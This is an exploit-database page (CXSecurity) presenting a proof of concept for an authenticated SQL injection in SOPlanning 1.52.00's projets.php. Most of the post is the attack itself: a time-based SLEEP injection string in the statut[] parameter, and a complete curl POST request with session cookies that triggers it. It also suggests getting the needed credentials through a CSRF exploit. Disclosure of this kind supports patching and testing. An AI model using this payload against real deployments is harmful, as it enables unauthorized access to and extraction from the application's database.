---
title: SOPlanning 1.52.00 SQL Injection
url: https://cxsecurity.com/issue/WLB-2024050008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-05-05
fetch_date: 2025-10-06T17:14:08.843326
---

# SOPlanning 1.52.00 SQL Injection

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **SOPlanning 1.52.00 SQL Injection** **2024.05.04**  Credit:  **[liquidsky](https://cxsecurity.com/author/liquidsky/1/)**  Risk: **Medium**  Local: **No**  Remote: ****Yes****  CVE: **N/A**  CWE: **[CWE-89](https://cxsecurity.com/cwe/CWE-89 "Click to see CWE-89")** | |

Exploit Title: SOPlanning v1.52.00 'projets.php' SQLi
Application: SOPlanning
Version: 1.52.00
Date: 4/22/24
Exploit Author: Joseph McPeters (Liquidsky)
Vendor Homepage: https://www.soplanning.org/en/
Software Link: https://sourceforge.net/projects/soplanning/
Tested on: Linux
CVE: Not yet assigned
Description: SOPlanning v1.52.00 is vulnerable to Authenticated SQL Injection via the 'projects.php' page.
Instructions: Authenticate to the host, the credentials can be obtained using a CSRF exploit (more info included). Once valid credentials are obtained use either a GET/POST request to send the valid parameters that equal to valid SQLi.
Vulnerable request parameters for request to "/www/projets.php":
filtreGroupeProjet=1&statut[]=todo'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+'Liquidsky'='Liquidsky&rechercheProjet=test
The above parameters can be sent as either a valid GET/POST request to trigger the SQLi.
Example Curl Request To Re-Test SQLi:
curl -i -s -k -X $'POST' \
-H $'Host: 127.0.0.1' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86\_64; rv:109.0) Gecko/20100101 Firefox/115.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,\*/\*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate, br' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 130' -H $'Origin: http://127.0.0.1<http://127.0.0.1/>' -H $'Connection: close' -H $'Referer: http://127.0.0.1/soplanning/www/projets.php' -H $'Upgrade-Insecure-Requests: 1' -H $'Sec-Fetch-Dest: document' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-User: ?1' \
-b $'dateDebut=23/04/2024; dateFin=23/06/2024; xposMoisWin=0; xposJoursWin=0; yposMoisWin=0; yposJoursWin=0; yposProjets=33; PHPSESSID=ovpbclvbc87uh7anfbq2luf9bi; soplanningplanning\_=hhrtf0rgs562vm8rhn5i641481; baseLigne=users; baseColonne=jours; afficherTableauRecap=1; masquerLigneVide=0; statut\_projet=%5B%22abort%22%2C%22archive%22%2C%22done%22%2C%22progress%22%2C%22todo%22%5D' \
--data-binary $'filtreGroupeProjet=1&statut[]=todo\'+AND+(SELECT+8073+FROM+(SELECT(SLEEP(10)))PuxA)+AND+\'Liquidsky\'=\'Liquidsky&rechercheProjet=test' \
$'http://127.0.0.1/soplanning/www/projets.php'
Note: Cookies need to be authenticated and request needs to be valid for valid SQLi. This curl request can be used with a proxy to reconstruct a valid request.

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024050008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top